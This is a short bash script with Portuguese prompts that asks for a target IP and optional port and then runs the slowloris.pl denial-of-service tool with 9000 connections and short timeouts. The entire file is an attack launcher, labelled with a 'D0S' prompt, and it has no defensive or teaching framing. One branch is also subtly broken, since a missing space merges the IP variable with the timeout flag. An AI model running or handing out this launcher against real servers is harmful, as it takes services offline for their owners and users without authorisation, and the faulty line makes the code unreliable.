#!/bin/bash

echo "Deseja fazer o ataque em uma porta expecifica?"
echo "S/N"
read -p "D0S >> " escolha2

case "$escolha2" in
	S)
		read -p "ip: " ip2
		read -p "porta: " port2
		./slowloris.pl -dns $ip2 -port $port2 -timeout 1 -num 9000 -tcpto 5 
	;;

	N)
		read -p "ip: " ip3 
		./slowloris.pl -dns $ip3-timeout 1 -num 9000 -tcpto 5 
	;;

	esac
